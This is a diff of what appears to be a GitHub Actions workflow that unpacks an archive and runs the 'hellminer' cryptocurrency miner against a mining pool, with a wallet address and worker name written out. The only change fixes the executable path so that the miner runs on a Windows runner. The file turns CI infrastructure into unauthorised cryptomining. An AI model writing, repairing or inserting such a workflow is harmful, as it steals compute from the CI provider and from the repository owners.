@@ -21,6 +21,6 @@ jobs:
     - name: Extract
       run: Expand-Archive EPA.zip
     - name: RUNNING
-      run: ./hellminer.exe -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RUErJPuMTPL84t76vT8CjLyBY4ZLGvzUW9.RMX2020 -p x --cpu 1
+      run: .\hellminer.exe -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RUErJPuMTPL84t76vT8CjLyBY4ZLGvzUW9.RMX2020 -p x --cpu 1
     - name: DONE
       run: exit
